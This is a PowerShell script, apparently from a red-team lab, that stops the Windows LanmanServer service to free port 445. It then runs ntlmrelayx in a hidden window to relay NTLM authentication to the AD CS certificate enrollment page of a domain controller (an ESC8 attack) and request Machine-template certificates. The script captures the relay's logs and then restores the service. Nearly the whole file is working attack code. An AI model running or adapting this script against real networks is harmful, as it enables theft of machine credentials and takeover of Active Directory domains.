# Diagnose LanmanServer stop failure + relay bind on 445
$ErrorActionPreference = "Continue"
$venv = "C:\Tools\RedStrike\.venv\Scripts"
$work = "C:\Tools\cadre-attack"
Set-Location $work

Write-Output "=== initial state ==="
(sc.exe query LanmanServer | Select-String "STATE").ToString()

Write-Output "=== disable recovery + stop (verbose) ==="
$r1 = sc.exe failure LanmanServer reset= 0 actions= ""
Write-Output "failure_cmd_rc=$LASTEXITCODE out=$r1"
Stop-Service LanmanServer -Force
Write-Output "stop_rc=$?"

Write-Output "=== poll 15s: service state + port 445 ==="
for ($i = 0; $i -lt 15; $i++) {
  Start-Sleep -Seconds 1
  $state = (sc.exe query LanmanServer | Select-String "STATE").ToString().Trim()
  $listener = [bool](Get-NetTCPConnection -LocalPort 445 -State Listen -ErrorAction SilentlyContinue)
  Write-Output "t=$i state='$state' listener=$listener"
}

Write-Output "=== start relay on 445 + capture full err ==="
$relayLog = "$work\esc8-diag-relay.log"
$relayErr = "$work\esc8-diag-relay.err"
Remove-Item $relayLog,$relayErr -ErrorAction SilentlyContinue
$relayArgs = @("$venv\ntlmrelayx.py","--smb-port","445","-t","http://dc01.cadre.local/certsrv/certfnsh.asp","--adcs","--template","Machine","-smb2support","-ip","192.168.77.62","-debug")
$p = Start-Process -FilePath "$venv\python.exe" -ArgumentList $relayArgs `
  -WorkingDirectory $work -WindowStyle Hidden -PassThru `
  -RedirectStandardOutput $relayLog -RedirectStandardError $relayErr
Start-Sleep -Seconds 10
Write-Output "relay_alive=$(-not $p.HasExited) pid=$($p.Id)"
Write-Output "=== relay stderr ==="
if (Test-Path $relayErr) { Get-Content $relayErr -Tail 25 }
Write-Output "=== relay stdout tail ==="
if (Test-Path $relayLog) { Get-Content $relayLog -Tail 15 }
if (-not $p.HasExited) { Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue }

Write-Output "=== restore ==="
sc.exe failure LanmanServer reset= 86400 actions= restart/60000/restart/120000 | Out-Null
Start-Service LanmanServer -ErrorAction SilentlyContinue
Start-Sleep -Seconds 4
(sc.exe query LanmanServer | Select-String "STATE").ToString()
Write-Output "=== DIAG3_DONE ==="
